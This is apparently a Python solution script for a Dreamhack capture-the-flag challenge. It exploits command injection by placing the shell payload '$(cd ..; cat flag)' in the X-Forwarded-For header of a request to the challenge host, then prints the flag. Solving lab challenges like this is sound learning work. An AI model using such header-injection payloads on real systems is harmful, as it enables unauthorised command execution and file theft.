# how to solve
# type : command injection?
# can excute command by replacing access_route value
# find where is flag then pass parameter

import requests

# 요청 정보 설정
url = "http://host3.dreamhack.games:21289/"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
}

# requests 라이브러리 사용
with requests.Session() as session:
    # 접근 경로 설정
    session.headers["X-Forwarded-For"] = "$(cd ..; cat flag)"
    
    # 요청 보내기
    response = session.get(url, headers=headers)

    # 응답 확인
    print(response.text)